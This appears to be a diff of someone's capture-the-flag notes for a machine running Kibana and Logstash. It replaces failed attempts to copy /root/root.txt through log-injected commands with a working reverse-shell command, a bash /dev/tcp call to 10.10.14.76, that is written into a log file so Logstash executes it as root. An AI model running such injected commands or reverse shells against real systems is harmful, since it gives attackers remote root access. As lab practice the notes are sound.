@@ -88,9 +88,14 @@ logs      : /var/log/logstash
 
 # copy/paste when kibana: it seems to take ~30 minutes for the conf files to be
 # read. Also, maybe have to modify the conf files to trigger.
-cp /etc/logstash/conf.d/input.conf /etc/logstash/conf.d/a.conf; rm /etc/logstash/conf.d/a.conf; cp /etc/logstash/conf.d/input.conf /etc/logstash/conf.d/a.conf
-echo "Ejecutar comando : cp /root/root.txt /tmp/.test.txt" >> /opt/kibana/logstash_0
-echo "Ejecutar comando : chmod 777 /tmp/.test.txt" >> /opt/kibana/logstash_0
-echo "Ejecutar comando : rm /tmp/.test.txt" >> /opt/kibana/logstash_0
+# THIS DOESNT WORK... THEY HAVE SAFEGUARDS AND YOU MUST SET UP A REVERSE SHELL...
+#cp /etc/logstash/conf.d/input.conf /etc/logstash/conf.d/a.conf; rm /etc/logstash/conf.d/a.conf; cp /etc/logstash/conf.d/input.conf /etc/logstash/conf.d/a.conf
+#echo "Ejecutar comando : cp /root/root.txt /tmp/.test.txt" >> /opt/kibana/logstash_0
+#echo "Ejecutar comando : chmod 777 /tmp/.test.txt" >> /opt/kibana/logstash_0
+#echo "Ejecutar comando : rm /tmp/.test.txt" >> /opt/kibana/logstash_0
 
+# need to reverse shell
+# bash -i >& /dev/tcp/ip/port 0>&1
+echo "Ejecutar comando : bash -i >& /dev/tcp/10.10.14.76/7001 0>&1" >> /opt/kibana/logstash_0
 
+rooted!
